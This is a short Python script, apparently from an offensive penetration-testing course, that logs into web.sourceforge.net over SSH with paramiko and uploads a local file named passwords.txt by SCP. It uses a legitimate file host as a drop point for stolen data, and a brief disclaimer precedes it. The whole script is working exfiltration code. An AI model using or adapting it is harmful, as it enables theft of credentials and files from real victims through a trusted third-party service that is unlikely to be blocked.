'''
Caution
--------
Using this script for any malicious purpose is prohibited and against the law. Please read SourceForge terms and conditions carefully. 
Use it on your own risk. 
'''

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import paramiko
import scp

# File Management on SourceForge 
# [+] https://sourceforge.net/p/forge/documentation/File%20Management/


ssh_client = paramiko.SSHClient() # creating an ssh_client instance using paramiko sshclient class

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh_client.connect("web.sourceforge.net", username="udemy", password="PASSWORD HERE") #Authenticate ourselves to the sourceforge
print ("[+] Authenticating against web.sourceforge.net")

scp = scp.SCPClient(ssh_client.get_transport()) #after a sucessful authentication the ssh session id will be passed into SCPClient function

scp.put("C:/Users/Alex/Desktop/passwords.txt") # upload a file
print ("[+} File is uploaded")

scp.close()

print("[+] Closing the socket")
